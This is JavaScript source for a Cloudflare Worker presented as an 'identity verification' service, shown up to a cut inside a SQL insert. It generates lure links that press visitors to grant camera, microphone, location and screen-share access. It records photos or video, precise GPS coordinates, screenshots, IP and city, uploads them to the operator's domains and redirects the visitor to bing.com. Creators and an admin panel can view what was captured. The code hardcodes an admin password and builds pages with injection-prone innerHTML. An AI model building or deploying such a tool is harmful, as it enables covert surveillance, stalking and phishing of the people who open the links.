// Cloudflare Worker代码 - 真人身份验证镜系统
// D1数据库初始化SQL:
/*
CREATE TABLE IF NOT EXISTS records (
    id TEXT PRIMARY KEY,
    creator_ip TEXT,
    creator_ua TEXT,
    created_at INTEGER,
    total_views INTEGER DEFAULT 0,
    custom_redirect TEXT DEFAULT 'https://www.bing.com',
    custom_message TEXT DEFAULT '',
    cookie_template TEXT DEFAULT '',
    download_template TEXT DEFAULT '',
    require_location INTEGER DEFAULT 0,
    require_screenshot INTEGER DEFAULT 0,
    max_video_time INTEGER DEFAULT 10
);

CREATE TABLE IF NOT EXISTS uploads (
    upload_id INTEGER PRIMARY KEY AUTOINCREMENT,
    record_id TEXT,
    visitor_ip TEXT,
    visitor_ua TEXT,
    visitor_country TEXT,
    visitor_city TEXT,
    file_url TEXT,
    upload_type TEXT,
    timestamp INTEGER,
    latitude REAL,
    longitude REAL,
    screenshot_data TEXT,
    FOREIGN KEY(record_id) REFERENCES records(id)
);

CREATE TABLE IF NOT EXISTS admin_logs (
    log_id INTEGER PRIMARY KEY AUTOINCREMENT,
    admin_ip TEXT,
    action TEXT,
    timestamp INTEGER
);

CREATE TABLE IF NOT EXISTS admin_sessions (
    session_id TEXT PRIMARY KEY,
    admin_ip TEXT,
    expires_at INTEGER
);
*/

const ADMIN_USERNAME = 'admin';
const ADMIN_PASSWORD = '1591156135qwzxcv';
const SESSION_SECRET = 'verification_mirror_pro_secret_2026';
const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5MB
const DOMAIN = 'zyjilqx.dpdns.org';
const UPLOAD_DOMAIN = 'tc.ilqx.dpdns.org';
const GEO_API = 'https://ip.ilqx.dpdns.org/geo';

// HTML模板
const htmlTemplates = {
  mainPage: `
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>真人身份验证镜 Pro</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        header {
            text-align: center;
            margin-bottom: 40px;
            padding-bottom: 20px;
            border-bottom: 2px solid #f0f0f0;
        }
        h1 {
            color: #333;
            font-size: 2.5rem;
            margin-bottom: 10px;
            background: linear-gradient(45deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .subtitle {
            color: #666;
            font-size: 1.1rem;
            margin-bottom: 30px;
        }
        .logo {
            font-size: 3rem;
            margin-bottom: 20px;
        }
        .tabs {
            display: flex;
            margin-bottom: 30px;
            border-bottom: 2px solid #e0e0e0;
        }
        .tab {
            padding: 15px 30px;
            cursor: pointer;
            background: #f8f9fa;
            margin-right: 5px;
            border-radius: 10px 10px 0 0;
            transition: all 0.3s;
        }
        .tab.active {
            background: white;
            border-bottom: 3px solid #667eea;
            font-weight: bold;
        }
        .tab-content {
            display: none;
            padding: 30px;
            background: white;
            border-radius: 0 0 10px 10px;
        }
        .tab-content.active {
            display: block;
        }
        .form-group {
            margin-bottom: 25px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
        }
        input[type="text"], input[type="password"], select, textarea {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        input[type="text"]:focus, input[type="password"]:focus, select:focus, textarea:focus {
            border-color: #667eea;
            outline: none;
        }
        .checkbox-group {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }
        .checkbox-group input {
            margin-right: 10px;
        }
        .btn {
            padding: 15px 30px;
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }
        .btn:active {
            transform: translateY(0);
        }
        .result-box {
            margin-top: 30px;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 10px;
            border-left: 5px solid #667eea;
        }
        .result-link {
            word-break: break-all;
            font-family: monospace;
            padding: 10px;
            background: white;
            border-radius: 5px;
            margin: 10px 0;
        }
        .warning {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            color: #856404;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        .uploads-list {
            margin-top: 20px;
        }
        .upload-item {
            padding: 15px;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .upload-info {
            flex: 1;
        }
        .upload-time {
            color: #666;
            font-size: 0.9rem;
        }
        .upload-location {
            color: #888;
            font-size: 0.8rem;
            margin-top: 5px;
        }
        .admin-menu {
            display: flex;
            gap: 10px;
            margin-bottom: 30px;
        }
        .admin-menu button {
            padding: 10px 20px;
            background: #f8f9fa;
            border: 2px solid #e0e0e0;
            border-radius: 5px;
            cursor: pointer;
        }
        .admin-menu button.active {
            background: #667eea;
            color: white;
            border-color: #667eea;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #e0e0e0;
        }
        th {
            background: #f8f9fa;
            font-weight: 600;
        }
        .file-preview {
            max-width: 100px;
            max-height: 100px;
            border-radius: 5px;
            cursor: pointer;
        }
        .file-preview:hover {
            transform: scale(1.1);
            transition: transform 0.2s;
        }
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
        }
        .modal-content {
            background: white;
            margin: 5% auto;
            padding: 20px;
            border-radius: 10px;
            max-width: 90%;
            max-height: 90%;
            overflow: auto;
        }
        .close-modal {
            float: right;
            font-size: 28px;
            cursor: pointer;
        }
        .camera-container {
            width: 100%;
            max-width: 640px;
            margin: 0 auto;
            text-align: center;
        }
        #video {
            width: 100%;
            border-radius: 10px;
            background: #000;
        }
        .camera-controls {
            margin-top: 20px;
            display: flex;
            gap: 10px;
            justify-content: center;
        }
        .timer {
            font-size: 1.5rem;
            font-weight: bold;
            color: #667eea;
            margin: 10px 0;
        }
        @media (max-width: 768px) {
            .container {
                padding: 20px;
            }
            h1 {
                font-size: 2rem;
            }
            .tabs {
                flex-direction: column;
            }
            .tab {
                margin-bottom: 5px;
                border-radius: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">🔍</div>
            <h1>真人身份验证镜 Pro</h1>
            <p class="subtitle">专业级身份验证解决方案 · 多重生物特征验证 · 实时地理位置匹配</p>
        </header>
        
        <div class="tabs">
            <div class="tab active" onclick="switchTab('generate')">生成验证链接</div>
            <div class="tab" onclick="switchTab('query')">查询验证记录</div>
            <div class="tab" onclick="switchTab('admin')" id="adminTab" style="display:none">管理员后台</div>
        </div>
        
        <!-- 生成面板 -->
        <div id="generateTab" class="tab-content active">
            <div class="warning">
                <strong>重要提示：</strong>本工具仅用于合法身份验证用途，使用者需自行承担所有法律责任。请确保您已获得对方明确同意。
            </div>
            
            <form id="generateForm">
                <div class="form-group">
                    <label for="userId">验证ID（唯一标识）</label>
                    <input type="text" id="userId" required 
                           placeholder="请输入会员账号或自定义唯一ID">
                </div>
                
                <div class="form-group">
                    <label for="redirectUrl">验证后跳转链接（可选）</label>
                    <input type="text" id="redirectUrl" 
                           placeholder="默认为：https://www.bing.com"
                           value="https://www.bing.com">
                </div>
                
                <div class="form-group">
                    <label>验证模式设置</label>
                    <div class="checkbox-group">
                        <input type="checkbox" id="requireLocation" value="1">
                        <label for="requireLocation">获取地理位置信息</label>
                    </div>
                    <div class="checkbox-group">
                        <input type="checkbox" id="requireScreenshot" value="1">
                        <label for="requireScreenshot">获取屏幕截图（需用户确认）</label>
                    </div>
                </div>
                
                <div class="form-group">
                    <label for="maxVideoTime">视频录制时长（秒）</label>
                    <input type="number" id="maxVideoTime" min="1" max="60" value="10">
                </div>
                
                <div class="checkbox-group">
                    <input type="checkbox" id="agreeTerms" required>
                    <label for="agreeTerms">我已阅读并同意《用户协议》和《免责声明》</label>
                </div>
                
                <button type="submit" class="btn">生成验证链接</button>
            </form>
            
            <div id="generateResult" class="result-box" style="display:none">
                <h3>验证链接生成成功！</h3>
                <p>请复制以下链接发送给需要验证的用户：</p>
                <div class="result-link" id="generatedLink"></div>
                <p style="margin-top: 15px; color: #666;">
                    <strong>使用说明：</strong><br>
                    1. 对方点击链接后需要进行身份验证<br>
                    2. 验证完成后您可以在查询面板查看结果<br>
                    3. 验证数据会定期清理，请及时保存
                </p>
            </div>
        </div>
        
        <!-- 查询面板 -->
        <div id="queryTab" class="tab-content">
            <div class="warning">
                <strong>查询说明：</strong>请输入验证ID查询相关的验证记录和文件。
            </div>
            
            <form id="queryForm">
                <div class="form-group">
                    <label for="queryId">验证ID</label>
                    <input type="text" id="queryId" required 
                           placeholder="请输入要查询的验证ID">
                </div>
                <button type="submit" class="btn">查询验证记录</button>
            </form>
            
            <div id="queryResult" style="display:none">
                <h3>验证记录</h3>
                <div class="uploads-list" id="uploadsList"></div>
            </div>
        </div>
        
        <!-- 管理员面板 -->
        <div id="adminTabContent" class="tab-content">
            <div id="adminLogin">
                <h3>管理员登录</h3>
                <form id="adminLoginForm">
                    <div class="form-group">
                        <label for="adminUsername">用户名</label>
                        <input type="text" id="adminUsername" required>
                    </div>
                    <div class="form-group">
                        <label for="adminPassword">密码</label>
                        <input type="password" id="adminPassword" required>
                    </div>
                    <button type="submit" class="btn">登录</button>
                </form>
            </div>
            
            <div id="adminDashboard" style="display:none">
                <div class="admin-menu">
                    <button class="active" onclick="showAdminSection('records')">所有记录</button>
                    <button onclick="showAdminSection('files')">所有文件</button>
                    <button onclick="showAdminSection('settings')">系统设置</button>
                    <button onclick="adminLogout()">退出登录</button>
                </div>
                
                <div id="adminRecords" class="admin-section">
                    <h3>所有验证记录</h3>
                    <div id="allRecordsTable"></div>
                </div>
                
                <div id="adminFiles" class="admin-section" style="display:none">
                    <h3>所有文件</h3>
                    <div id="allFilesTable"></div>
                </div>
                
                <div id="adminSettings" class="admin-section" style="display:none">
                    <h3>系统设置</h3>
                    <form id="systemSettingsForm">
                        <div class="form-group">
                            <label>系统维护模式</label>
                            <select id="maintenanceMode">
                                <option value="0">关闭</option>
                                <option value="1">开启</option>
                            </select>
                        </div>
                        <button type="submit" class="btn">保存设置</button>
                    </form>
                </div>
            </div>
        </div>
    </div>
    
    <!-- 文件预览模态框 -->
    <div id="previewModal" class="modal">
        <div class="modal-content">
            <span class="close-modal" onclick="closeModal()">&times;</span>
            <div id="modalContent"></div>
        </div>
    </div>
    
    <!-- 验证页面模板 -->
    <div id="verificationPage" style="display:none">
        <div class="container">
            <header>
                <h1>身份验证</h1>
                <p class="subtitle">请完成以下验证以确保您是真人操作</p>
            </header>
            
            <div class="warning" id="permissionWarning">
                本网站需要获取摄像头权限进行身份验证。请点击"允许"继续。
            </div>
            
            <div class="camera-container" id="cameraContainer" style="display:none">
                <div id="modeSelector">
                    <button class="btn" onclick="startPhotoMode()">拍照验证</button>
                    <button class="btn" onclick="startVideoMode()">视频验证</button>
                </div>
                
                <div id="photoMode" style="display:none">
                    <video id="video" autoplay playsinline></video>
                    <div class="camera-controls">
                        <button class="btn" onclick="capturePhoto()">拍照</button>
                        <button class="btn" onclick="cancelVerification()">取消</button>
                    </div>
                    <canvas id="canvas" style="display:none"></canvas>
                    <img id="photoResult" style="display:none; max-width:100%; margin-top:20px;">
                </div>
                
                <div id="videoMode" style="display:none">
                    <video id="videoRecorder" autoplay playsinline></video>
                    <div class="timer" id="timer">00:10</div>
                    <div class="camera-controls">
                        <button class="btn" onclick="startRecording()" id="recordBtn">开始录制</button>
                        <button class="btn" onclick="stopRecording()" id="stopBtn" style="display:none">停止录制</button>
                        <button class="btn" onclick="cancelVerification()">取消</button>
                    </div>
                    <video id="videoResult" controls style="display:none; width:100%; margin-top:20px;"></video>
                </div>
            </div>
            
            <div id="permissionDenied" style="display:none; text-align:center; padding:50px;">
                <h2 style="color:#dc3545;">权限被拒绝</h2>
                <p>您拒绝了必要的权限，无法继续进行验证。</p>
                <p>请刷新页面并允许权限请求，或使用支持相关功能的浏览器。</p>
                <button class="btn" onclick="location.reload()">重新尝试</button>
            </div>
            
            <div id="uploadProgress" style="display:none; text-align:center; padding:50px;">
                <h3>正在上传验证文件...</h3>
                <div style="width:100%; height:20px; background:#f0f0f0; border-radius:10px; margin:20px auto;">
                    <div id="progressBar" style="width:0%; height:100%; background:#667eea; border-radius:10px; transition:width 0.3s"></div>
                </div>
            </div>
            
            <div id="uploadComplete" style="display:none; text-align:center; padding:50px;">
                <h2 style="color:#28a745;">验证完成！</h2>
                <p>身份验证已成功完成。</p>
                <p id="redirectMessage">正在跳转...</p>
            </div>
        </div>
    </div>
    
    <script>
        // 页面切换
        function switchTab(tabName) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(t => t.style.display = 'none');
            
            document.querySelector(`.tab[onclick*="${tabName}"]`).classList.add('active');
            document.getElementById(tabName + 'Tab').style.display = 'block';
            document.getElementById(tabName + 'Tab').classList.add('active');
            
            if (tabName === 'admin') {
                checkAdminLogin();
            }
        }
        
        // 生成链接
        document.getElementById('generateForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const userId = document.getElementById('userId').value.trim();
            const redirectUrl = document.getElementById('redirectUrl').value.trim();
            const requireLocation = document.getElementById('requireLocation').checked;
            const requireScreenshot = document.getElementById('requireScreenshot').checked;
            const maxVideoTime = document.getElementById('maxVideoTime').value;
            
            const response = await fetch('/api/generate', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    id: userId,
                    redirectUrl: redirectUrl || 'https://www.bing.com',
                    requireLocation: requireLocation,
                    requireScreenshot: requireScreenshot,
                    maxVideoTime: parseInt(maxVideoTime)
                })
            });
            
            const result = await response.json();
            if (result.success) {
                const link = 'https://' + '${DOMAIN}' + '/' + userId;
                document.getElementById('generatedLink').textContent = link;
                document.getElementById('generateResult').style.display = 'block';
                
                // 复制到剪贴板
                navigator.clipboard.writeText(link);
                alert('链接已生成并复制到剪贴板！');
            } else {
                alert('生成失败：' + result.error);
            }
        });
        
        // 查询记录
        document.getElementById('queryForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const queryId = document.getElementById('queryId').value.trim();
            
            const response = await fetch(`/api/query/${queryId}`);
            const result = await response.json();
            
            if (result.success && result.uploads) {
                const uploadsList = document.getElementById('uploadsList');
                uploadsList.innerHTML = '';
                
                result.uploads.forEach(upload => {
                    const uploadDiv = document.createElement('div');
                    uploadDiv.className = 'upload-item';
                    
                    const fileUrl = 'https://' + '${UPLOAD_DOMAIN}' + upload.file_url;
                    const time = new Date(upload.timestamp * 1000).toLocaleString();
                    
                    uploadDiv.innerHTML = \`
                        <div class="upload-info">
                            <strong>\${upload.upload_type === 'photo' ? '照片' : '视频'}</strong>
                            <div class="upload-time">\${time}</div>
                            <div class="upload-location">IP: \${upload.visitor_ip} | 位置: \${upload.visitor_city || '未知'}</div>
                        </div>
                        <div>
                            <img src="\${fileUrl}" 
                                 class="file-preview" 
                                 onclick="previewFile('\${fileUrl}', '\${upload.upload_type}')">
                        </div>
                    \`;
                    
                    uploadsList.appendChild(uploadDiv);
                });
                
                document.getElementById('queryResult').style.display = 'block';
            } else {
                alert('查询失败或没有记录：' + (result.error || ''));
            }
        });
        
        // 管理员功能
        function checkAdminLogin() {
            if (localStorage.getItem('adminSession')) {
                document.getElementById('adminLogin').style.display = 'none';
                document.getElementById('adminDashboard').style.display = 'block';
                loadAdminData();
            }
        }
        
        document.getElementById('adminLoginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const username = document.getElementById('adminUsername').value;
            const password = document.getElementById('adminPassword').value;
            
            const response = await fetch('/api/admin/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, password })
            });
            
            const result = await response.json();
            if (result.success) {
                localStorage.setItem('adminSession', result.session);
                checkAdminLogin();
            } else {
                alert('登录失败：' + result.error);
            }
        });
        
        function adminLogout() {
            localStorage.removeItem('adminSession');
            location.reload();
        }
        
        async function loadAdminData() {
            const session = localStorage.getItem('adminSession');
            const response = await fetch('/api/admin/records', {
                headers: { 'X-Session': session }
            });
            
            const result = await response.json();
            if (result.success) {
                renderRecordsTable(result.records);
            }
        }
        
        function renderRecordsTable(records) {
            let html = '<table>';
            html += '<tr><th>ID</th><th>创建者IP</th><th>创建时间</th><th>查看次数</th><th>验证次数</th><th>操作</th></tr>';
            
            records.forEach(record => {
                const time = new Date(record.created_at * 1000).toLocaleString();
                html += \`<tr>
                    <td>\${record.id}</td>
                    <td>\${record.creator_ip}</td>
                    <td>\${time}</td>
                    <td>\${record.total_views}</td>
                    <td>\${record.verification_count || 0}</td>
                    <td>
                        <button onclick="viewRecordDetails('\${record.id}')">查看详情</button>
                        <button onclick="deleteRecord('\${record.id}')">删除</button>
                    </td>
                </tr>\`;
            });
            
            html += '</table>';
            document.getElementById('allRecordsTable').innerHTML = html;
        }
        
        function showAdminSection(section) {
            document.querySelectorAll('.admin-section').forEach(s => s.style.display = 'none');
            document.querySelectorAll('.admin-menu button').forEach(b => b.classList.remove('active'));
            
            document.getElementById('admin' + section.charAt(0).toUpperCase() + section.slice(1)).style.display = 'block';
            event.target.classList.add('active');
        }
        
        // 文件预览
        function previewFile(url, type) {
            const modal = document.getElementById('previewModal');
            const content = document.getElementById('modalContent');
            
            if (type === 'photo') {
                content.innerHTML = \`<img src="\${url}" style="max-width:100%; max-height:80vh;">\`;
            } else {
                content.innerHTML = \`<video src="\${url}" controls style="max-width:100%; max-height:80vh;"></video>\`;
            }
            
            modal.style.display = 'block';
        }
        
        function closeModal() {
            document.getElementById('previewModal').style.display = 'none';
        }
        
        // 验证页面功能
        let mediaStream = null;
        let mediaRecorder = null;
        let recordedChunks = [];
        let recordingTimer = null;
        let timeLeft = 10;
        
        async function initVerification() {
            // 请求摄像头权限
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        facingMode: 'user'
                    },
                    audio: true
                });
                
                document.getElementById('permissionWarning').style.display = 'none';
                document.getElementById('cameraContainer').style.display = 'block';
                
                const video = document.getElementById('video') || document.getElementById('videoRecorder');
                video.srcObject = mediaStream;
                
            } catch (err) {
                console.error('获取摄像头权限失败:', err);
                document.getElementById('permissionDenied').style.display = 'block';
            }
        }
        
        function startPhotoMode() {
            document.getElementById('modeSelector').style.display = 'none';
            document.getElementById('photoMode').style.display = 'block';
        }
        
        function startVideoMode() {
            document.getElementById('modeSelector').style.display = 'none';
            document.getElementById('videoMode').style.display = 'block';
        }
        
        function capturePhoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const photo = document.getElementById('photoResult');
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            photo.src = canvas.toDataURL('image/jpeg', 0.8);
            photo.style.display = 'block';
            
            // 上传照片
            canvas.toBlob(blob => {
                uploadFile(blob, 'photo');
            }, 'image/jpeg', 0.8);
        }
        
        function startRecording() {
            const stream = mediaStream;
            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9' });
            recordedChunks = [];
            
            mediaRecorder.ondataavailable = event => {
                if (event.data.size > 0) {
                    recordedChunks.push(event.data);
                }
            };
            
            mediaRecorder.onstop = () => {
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                if (blob.size > 0) {
                    uploadFile(blob, 'video');
                }
            };
            
            mediaRecorder.start();
            document.getElementById('recordBtn').style.display = 'none';
            document.getElementById('stopBtn').style.display = 'inline-block';
            
            // 开始计时
            timeLeft = parseInt(new URLSearchParams(window.location.search).get('maxTime') || 10);
            startTimer();
        }
        
        function startTimer() {
            const timerElement = document.getElementById('timer');
            
            recordingTimer = setInterval(() => {
                timeLeft--;
                timerElement.textContent = '00:' + timeLeft.toString().padStart(2, '0');
                
                if (timeLeft <= 0) {
                    stopRecording();
                }
            }, 1000);
        }
        
        function stopRecording() {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
                clearInterval(recordingTimer);
                
                document.getElementById('stopBtn').style.display = 'none';
                document.getElementById('videoResult').style.display = 'block';
                
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                const videoURL = URL.createObjectURL(blob);
                document.getElementById('videoResult').src = videoURL;
            }
        }
        
        function cancelVerification() {
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
            }
            if (recordingTimer) {
                clearInterval(recordingTimer);
            }
            // 返回上一页或关闭窗口
            window.history.back();
        }
        
        async function uploadFile(blob, type) {
            if (blob.size > ${MAX_FILE_SIZE}) {
                alert('文件大小超过5MB限制，请重新验证。');
                return;
            }
            
            document.getElementById('cameraContainer').style.display = 'none';
            document.getElementById('uploadProgress').style.display = 'block';
            
            const formData = new FormData();
            formData.append('file', blob, \`verification.\${type === 'photo' ? 'jpg' : 'webm'}\`);
            formData.append('type', type);
            formData.append('recordId', window.location.pathname.split('/').pop());
            
            // 获取地理位置（如果需要）
            const params = new URLSearchParams(window.location.search);
            if (params.get('requireLocation') === '1') {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 5000,
                            maximumAge: 0
                        });
                    });
                    
                    formData.append('latitude', position.coords.latitude);
                    formData.append('longitude', position.coords.longitude);
                } catch (err) {
                    console.warn('获取地理位置失败:', err);
                }
            }
            
            // 获取屏幕截图（如果需要）
            if (params.get('requireScreenshot') === '1') {
                try {
                    const screenStream = await navigator.mediaDevices.getDisplayMedia({ 
                        video: true,
                        audio: false 
                    });
                    
                    const videoTrack = screenStream.getVideoTracks()[0];
                    const imageCapture = new ImageCapture(videoTrack);
                    const bitmap = await imageCapture.grabFrame();
                    
                    const canvas = document.createElement('canvas');
                    canvas.width = bitmap.width;
                    canvas.height = bitmap.height;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(bitmap, 0, 0);
                    
                    const screenshotBlob = await new Promise(resolve => {
                        canvas.toBlob(resolve, 'image/jpeg', 0.7);
                    });
                    
                    const screenshotFormData = new FormData();
                    screenshotFormData.append('file', screenshotBlob, 'screenshot.jpg');
                    screenshotFormData.append('type', 'screenshot');
                    
                    // 上传截图
                    const screenshotResponse = await fetch('https://${UPLOAD_DOMAIN}/upload', {
                        method: 'POST',
                        body: screenshotFormData
                    });
                    
                    const screenshotResult = await screenshotResponse.json();
                    if (screenshotResult[0] && screenshotResult[0].src) {
                        formData.append('screenshotUrl', screenshotResult[0].src);
                    }
                    
                    videoTrack.stop();
                } catch (err) {
                    console.warn('获取屏幕截图失败:', err);
                }
            }
            
            // 上传文件
            const xhr = new XMLHttpRequest();
            xhr.open('POST', '/api/upload', true);
            
            xhr.upload.onprogress = (event) => {
                if (event.lengthComputable) {
                    const percent = (event.loaded / event.total) * 100;
                    document.getElementById('progressBar').style.width = percent + '%';
                }
            };
            
            xhr.onload = async () => {
                if (xhr.status === 200) {
                    document.getElementById('uploadProgress').style.display = 'none';
                    document.getElementById('uploadComplete').style.display = 'block';
                    
                    // 延迟跳转
                    setTimeout(() => {
                        const redirectUrl = params.get('redirect') || 'https://www.bing.com';
                        window.location.href = redirectUrl;
                    }, 3000);
                } else {
                    alert('上传失败，请重试。');
                    location.reload();
                }
            };
            
            xhr.onerror = () => {
                alert('上传失败，请检查网络连接。');
                location.reload();
            };
            
            xhr.send(formData);
        }
        
        // 页面加载时初始化
        window.onload = () => {
            const path = window.location.pathname;
            
            if (path === '/') {
                // 主页面
                document.getElementById('adminTab').style.display = 'none';
            } else if (path.startsWith('/admin')) {
                // 管理员页面
                switchTab('admin');
            } else if (path.length > 1 && !path.startsWith('/api') && !path.startsWith('/file')) {
                // 验证页面
                document.body.innerHTML = document.getElementById('verificationPage').innerHTML;
                initVerification();
            }
        };
        
        // 模态框点击关闭
        window.onclick = (event) => {
            const modal = document.getElementById('previewModal');
            if (event.target === modal) {
                closeModal();
            }
        };
    </script>
</body>
</html>
  `,

  verificationPageScript: `
// 验证页面的JavaScript代码
const recordId = window.location.pathname.split('/').pop();
const urlParams = new URLSearchParams(window.location.search);
let mediaStream = null;
let mediaRecorder = null;
let recordedChunks = [];
let recordingTimer = null;
let timeLeft = 10;

async function initVerification() {
    // 显示权限请求对话框
    showPermissionRequest();
}

function showPermissionRequest() {
    // 这里可以自定义权限请求的样式和逻辑
    const permissionHTML = \`
    <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:1000; display:flex; align-items:center; justify-content:center;">
        <div style="background:white; padding:40px; border-radius:15px; max-width:500px; text-align:center;">
            <h2 style="margin-bottom:20px;">身份验证请求</h2>
            <p style="margin-bottom:20px; color:#666;">本网站需要获取以下权限以完成身份验证：</p>
            <ul style="text-align:left; margin-bottom:30px;">
                <li>📷 摄像头权限（用于拍照/录像验证）</li>
                \${urlParams.get('requireLocation') === '1' ? '<li>📍 地理位置权限</li>' : ''}
                \${urlParams.get('requireScreenshot') === '1' ? '<li>🖥️ 屏幕共享权限（用于截图验证）</li>' : ''}
            </ul>
            <p style="color:#dc3545; margin-bottom:30px; font-size:14px;">
                注意：拒绝权限将无法进行验证！
            </p>
            <div style="display:flex; gap:20px; justify-content:center;">
                <button onclick="requestPermissions()" style="padding:12px 30px; background:#28a745; color:white; border:none; border-radius:8px; cursor:pointer;">
                    同意并继续
                </button>
                <button onclick="denyPermissions()" style="padding:12px 30px; background:#dc3545; color:white; border:none; border-radius:8px; cursor:pointer;">
                    拒绝
                </button>
            </div>
        </div>
    </div>
    \`;
    
    document.body.insertAdjacentHTML('beforeend', permissionHTML);
}

async function requestPermissions() {
    try {
        // 移除权限请求对话框
        document.querySelector('div[style*="position:fixed"]').remove();
        
        // 请求摄像头权限
        mediaStream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                width: { ideal: 1280 },
                height: { ideal: 720 },
                facingMode: 'user'
            },
            audio: urlParams.get('audio') === '1'
        });
        
        document.getElementById('permissionWarning').style.display = 'none';
        document.getElementById('cameraContainer').style.display = 'block';
        
        const video = document.getElementById('video') || document.getElementById('videoRecorder');
        video.srcObject = mediaStream;
        
        // 记录访问
        await fetch(\`/api/visit/\${recordId}\`, { method: 'POST' });
        
    } catch (err) {
        console.error('获取权限失败:', err);
        showPermissionDenied();
    }
}

function denyPermissions() {
    document.querySelector('div[style*="position:fixed"]').remove();
    showPermissionDenied();
}

function showPermissionDenied() {
    document.getElementById('permissionDenied').style.display = 'block';
    document.getElementById('cameraContainer').style.display = 'none';
}

// 其他验证页面函数...
  `
};

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const path = url.pathname;
    
    // CORS头
    const corsHeaders = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Session'
    };
    
    if (request.method === 'OPTIONS') {
      return new Response(null, {
        headers: corsHeaders
      });
    }
    
    // API路由
    if (path.startsWith('/api/')) {
      return handleAPI(request, env, url);
    }
    
    // 管理员页面
    if (path === '/admin') {
      return handleAdminPage(request, env);
    }
    
    // 验证页面（动态ID）
    const idMatch = path.match(/^\/([a-zA-Z0-9_\-]+)$/);
    if (idMatch && idMatch[1] !== 'api' && idMatch[1] !== 'admin') {
      return handleVerificationPage(request, env, idMatch[1]);
    }
    
    // 主页面
    return new Response(htmlTemplates.mainPage, {
      headers: {
        'Content-Type': 'text/html;charset=UTF-8',
        ...corsHeaders
      }
    });
  }
};

// API处理器
async function handleAPI(request, env, url) {
  const path = url.pathname;
  
  switch (path) {
    case '/api/generate':
      return handleGenerate(request, env);
      
    case '/api/admin/login':
      return handleAdminLogin(request, env);
      
    case '/api/admin/records':
      return handleAdminRecords(request, env);
      
    default:
      if (path.startsWith('/api/query/')) {
        const id = path.split('/')[3];
        return handleQuery(id, env, request);
      }
      if (path.startsWith('/api/visit/')) {
        const id = path.split('/')[3];
        return handleVisit(id, env, request);
      }
      if (path === '/api/upload') {
        return handleUpload(request, env);
      }
      if (path.startsWith('/api/admin/delete/')) {
        const id = path.split('/')[4];
        return handleDeleteRecord(id, env, request);
      }
      
      return new Response(JSON.stringify({ error: 'API endpoint not found' }), {
        status: 404,
        headers: { 'Content-Type': 'application/json' }
      });
  }
}

// 生成链接
async function handleGenerate(request, env) {
  try {
    const data = await request.json();
    const { id, redirectUrl, requireLocation, requireScreenshot, maxVideoTime } = data;
    
    if (!id) {
      return new Response(JSON.stringify({ error: 'ID不能为空' }), {
        status: 400,
        headers: { 'Content-Type': 'application/json' }
      });
    }
    
    // 获取用户IP和User-Agent
    const ip = request.headers.get('CF-Connecting-IP') || 
               request.headers.get('X-Forwarded-For') || 
               'unknown';
    const ua = request.headers.get('User-Agent') || 'unknown';
    
    // 插入记录到数据库
    await env.DB.prepare(`
      INSERT OR REPLACE INTO records 
      (id, creator_ip, creator_ua, created_at, custom_redirect, require_location, require_screenshot, max_video_time)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?)
